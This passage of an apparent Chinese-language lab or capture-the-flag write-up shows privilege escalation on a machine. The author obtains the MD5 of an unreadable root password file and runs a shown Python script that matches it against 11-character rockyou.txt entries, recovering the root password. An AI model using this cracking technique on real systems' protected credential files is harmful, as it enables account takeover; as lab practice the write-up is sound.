在/var/www目录下看见了一个ROOTPASS的文件

messagemaster@MSG:/var/www$ ls -al ROOTPASS 
-rw-r----- 1 root root 12 Nov 21  2022 ROOTPASS
messagemaster@MSG:/var/www$ cat ROOTPASS 
cat: ROOTPASS: Permission denied

无法直接读取，那么通过md5sum命令读一下这个文件的md5值

并且可以知道这个文件的长度为12位，猜测是带有换行符的，那么只需要在rockyou.txt内找到11位长度的字符，并且对这些字符进行加换行符的md5加密，然后跟ROOTPASS的md5值进行碰撞，即可得到ROOTPASS的md5值所对应的字符是哪个了

┌──(root㉿kali)-[/home/kali/bash]
└─# python3 md5.py
[+] FOUND: Message5687  ->  85c73111b30f9ede8504bb4a4b682f48
┌──(root㉿kali)-[/home/kali/bash]
└─# cat md5.py         
#!/usr/bin/env python3
import hashlib, sys, os

TARGET   = "85c73111b30f9ede8504bb4a4b682f48"
WL_PATH  = "rockyou.txt"      # 按需改路径
FOUND    = False

def main():
    global FOUND
    try:
        with open(WL_PATH, "rb") as f:             # 二进制打开，避免编码问题
            for cnt, line in enumerate(f, 1):
                plain = line.rstrip(b"\r\n")       # 去掉原有换行
                if len(plain) != 11:               # 只留 11 字节
                    continue

                digest = hashlib.md5(plain + b"\n").hexdigest()
                if digest == TARGET:
                    print(f"[+] FOUND: {plain.decode(errors='ignore')}  ->  {digest}")
                    FOUND = True
                    break

                if cnt % 1_000_000 == 0:
                    sys.stderr.write(f"\r[+] scanned {cnt:,} lines …")
    except FileNotFoundError:
        print(f"[-] wordlist not found: {WL_PATH}")
        sys.exit(1)

    if not FOUND:
        print("\n[-] 11-char candidate with \\n not found.")

if __name__ == "__main__":
    main()
